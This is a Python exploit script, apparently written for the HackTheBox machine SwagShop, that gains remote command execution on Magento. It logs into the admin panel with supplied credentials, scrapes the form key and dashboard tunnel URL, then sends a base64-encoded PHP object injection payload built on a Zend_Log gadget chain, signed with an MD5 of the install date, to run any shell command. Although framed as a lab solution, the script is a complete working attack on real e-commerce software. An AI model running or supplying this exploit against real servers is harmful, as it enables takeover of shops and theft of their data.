#!/usr/bin/env python3
# For SwagShop from HackTheBox

import sys
from hashlib import md5
import base64
import re
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def usage():
    print("Usage: python <target> <argument>")
    print("Example: python http://10.10.10.140 \"uname -a\"")


if len(sys.argv) != 3:
    usage()
    exit(1)

target = sys.argv[1].rstrip("/")
cmd = sys.argv[2]


username = 'ircashem'           # Change this 
password = 'shouldwork'         # Change this
php_function = 'system'
install_date = 'Wed, 08 May 2019 07:23:09 +0000'    # Change this from /app/etc/local.xml

payload  = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\";s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function, len(cmd), cmd)

session = requests.Session()
res = session.get(target + "/index.php/admin/")
content = (res.content)
soup = BeautifulSoup(content, features="lxml")
form = soup.find('form')
fields = form.findAll('input')

formdata = dict( (field.get('name'), field.get('value')) for field in fields)

formdata["login[username]"] = u'%s' % username
formdata["login[password]"] = u'%s' % password

# print(formdata)

res = session.post(target + "/index.php/admin" , data = formdata)
content = (res.content).decode('utf-8')
# print(content)
url = re.search("ajaxBlockUrl = '(.*)'", content)
url = url.group(1)
# print("[+] URL Got: " + url)
key = re.search("var FORM_KEY = '(.*)'", content)
key = key.group(1)
# print("[+] KEY Got: " + key)

data = {
    'isAjax': 'false',
    'form_key': key
}

res = session.post(url+ "block/tab_orders/period/7d/?isAjax=true" , data=data)
content = (res.content.decode('utf-8'))
# print(content)
tunnel = re.search("src=\"(.*)\?ga=", content)
tunnel = tunnel.group(1)
# print("Got tunnel key: " , tunnel)

payload = base64.b64encode(payload.encode('utf-8'))

gh = md5((payload.decode('utf-8') + install_date).encode('utf-8')).hexdigest()

exploit = tunnel + '?ga=' + payload.decode('utf-8') + '&h=' + gh

try:
    # print(exploit)
    res =  session.get(exploit)
    content = res.content.decode('utf-8')
    print(content)
except:
    print("Exception occured.")
# posturl = urljoin(target + , form['action'])
# print (posturl)

# r = s.post(posturl, data=formdata)
# print (r.text)